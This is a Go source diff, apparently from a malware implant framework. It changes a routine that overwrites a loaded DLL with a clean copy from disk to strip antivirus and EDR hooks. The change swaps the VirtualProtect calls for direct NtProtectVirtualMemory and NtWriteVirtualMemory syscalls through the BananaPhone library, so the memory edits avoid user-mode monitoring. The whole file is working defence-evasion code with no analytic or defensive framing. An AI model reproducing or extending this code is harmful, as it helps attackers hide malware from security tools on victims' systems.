@@ -2,7 +2,7 @@ package main
 
 import (
 	"debug/pe"
-	"github.com/C-Sto/BananaPhone/pkg/BananaPhone"
+	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
 	"golang.org/x/sys/windows"
 	"io/ioutil"
 	"log"
@@ -10,8 +10,10 @@ import (
 	"unsafe"
 )
 
-func banana() (uint16){
-	bp, e := bananaphone.NewBananaPhone(bananaphone.DiskBananaPhoneMode)
+
+
+func banana() (uint16,uint16){
+	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
 	if e != nil {
 		panic(e)
 	}
@@ -20,8 +22,15 @@ func banana() (uint16){
 	if e != nil {
 		panic(e)
 	}
-	return write
+
+	protect, e := bp.GetSysID("NtProtectVirtualMemory")
+	if e != nil {
+		panic(e)
+	}
+
+	return write,protect
 }
+
 
 // RefreshPE reloads a DLL from disk into the current process
 // in an attempt to erase AV or EDR hooks placed at runtime.
@@ -42,9 +51,10 @@ func RefreshPE(name string) error {
 	return writeGoodBytes(ddf, name, x.VirtualAddress)
 }
 
+
 func writeGoodBytes(b []byte, pn string, virtualoffset uint32) error {
 
-	write:= banana()
+	write,protect:= banana()
 	t, e := syscall.LoadDLL(pn)
 	if e != nil {
 		return e
@@ -56,26 +66,26 @@ func writeGoodBytes(b []byte, pn string, virtualoffset uint32) error {
 
 
 	var old uint32
-	//const thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
-	thisThread,err := syscall.GetCurrentProcess()
-	if err != nil {
-		return err
-	}
-/*
+	sizet := len(b)
+	var thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
+	//thisThread,_ := syscall.GetCurrentProcess()
+	//if err != nil {
+	//	return err
+	//}
 	//NtProtectVirtualMemory
 	_, r := bananaphone.Syscall(
 		protect,
-		thisThread,
-		uintptr(dllOffset),
-		uintptr(len(b)),
+		uintptr(thisThread),
+		uintptr((unsafe.Pointer(&dllOffset))),
+		uintptr((unsafe.Pointer(&sizet))),
 		windows.PAGE_EXECUTE_READWRITE,
-		uintptr(unsafe.Pointer(&old)),
+		uintptr((unsafe.Pointer(&old))),
 	)
 	if r != nil {
-		fmt.Println("1")
 		return r
 	}
-*/
+
+/*
 	e = windows.VirtualProtect(
 		uintptr(dllOffset),
 		uintptr(len(b)),
@@ -85,7 +95,7 @@ func writeGoodBytes(b []byte, pn string, virtualoffset uint32) error {
 	if e != nil {
 		return e
 	}
-
+*/
 	//{{if .Config.Debug}}
 	log.Println("Made memory map RWX")
 	//{{end}}
@@ -97,7 +107,7 @@ func writeGoodBytes(b []byte, pn string, virtualoffset uint32) error {
 	}
 */
 	//NtWriteVirtualMemory
-	_, r := bananaphone.Syscall(
+	_, r = bananaphone.Syscall(
 		write, //NtWriteVirtualMemory
 		uintptr(thisThread),
 		uintptr(dllOffset),
@@ -115,27 +125,26 @@ func writeGoodBytes(b []byte, pn string, virtualoffset uint32) error {
 	log.Println("DLL overwritten")
 	//{{end}}
 
-/*
+
 	//NtProtectVirtualMemory
-	r1, r = bananaphone.Syscall(
+	_, r = bananaphone.Syscall(
 		protect,
 		uintptr(thisThread),
-		uintptr(dllOffset),
-		uintptr(len(b)),
+		uintptr((unsafe.Pointer(&dllOffset))),
+		uintptr((unsafe.Pointer(&sizet))),
 		uintptr(old),
 		uintptr(unsafe.Pointer(&old)),
 	)
 	if r != nil {
-		fmt.Println("3 %s %x\n", r, r1)
 		return r
 	}
-*/
 
 
-	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(len(b)), old, &old)
-	if e != nil {
-		return e
-	}
+
+	//e = windows.VirtualProtect(uintptr(dllOffset), uintptr(len(b)), old, &old)
+	//if e != nil {
+	//	return e
+	//}
 	//{{if .Config.Debug}}
 	log.Println("Restored memory map permissions")
 	//{{end}}
